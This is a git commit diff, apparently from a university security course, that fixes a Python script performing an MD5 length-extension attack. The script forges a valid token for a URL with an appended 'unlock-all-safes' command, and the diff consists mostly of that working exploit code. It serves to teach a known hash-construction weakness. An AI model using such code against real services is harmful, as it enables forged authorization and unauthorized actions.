f6d3a849aa13367b55c958e9f673fbe4f6a986f2
Matthew McGlawn <mtm0002@auburn.edu>
2020-02-12 15:13:29 -0600

    Fixed Code to work

--- len_ext_attack.py
+++ len_ext_attack.py
@@ -1,7 +1,10 @@
 import sys
-import urllib
+from urllib.parse import quote
 from codecs import decode
 from pymd5 import md5, padding
+
+PASSWORD_LENGTH = 8
+NEW_MESSAGE = "&action2=unlock-all-safes&customer="#&user=admin&action1=unlock-all-safes
 
 def main():
 	if len(sys.argv) < 2:
@@ -9,19 +12,24 @@ def main():
 	else:
 		for i in range(1,len(sys.argv)):
 			address = sys.argv[i]
-			split_address = address.split("=", 2)
-			get_token = split_address[1].split("&")
-			m = get_token[0]
-			print(m)
-			length_of_m = 8
+			new_address = ""
+			split_address = address.split("&", 1)
+			#Splits directly after the token
+			get_token = split_address[0].split("=")
+			#Splits directly before the token
+			new_address += get_token[0] + "="
+			token = get_token[1]
+			message = split_address[1]
+			length_of_m = PASSWORD_LENGTH + len(message)
 			bits = (length_of_m + len(padding(length_of_m * 8))) * 8
-			h = md5(state = decode(m, "hex"), count = bits)
-			x = "Good advice"
-			h.update(x)
-			print(decode(m, "hex"))
-			#print(h.hexdigest())
-			answer = m.encode() + padding(length_of_m * 8) + x.encode()
-			#print(answer)
+			h = md5(state = decode(token, "hex"), count = bits)
+			h.update(NEW_MESSAGE)
+			new_address += h.hexdigest() + "&" + message + quote(padding(length_of_m * 8)) + NEW_MESSAGE
+			# new_address = new_address.encode() + padding(length_of_m * 8) + NEW_MESSAGE.encode()
+			print(new_address)
+			# print(get_token[0] + new_token + message + new_message)
+			# # answer = m.encode() + padding(len(m) * 8) + x.encode()
+			# # print(answer)
 
 if __name__ == '__main__':
 	main()
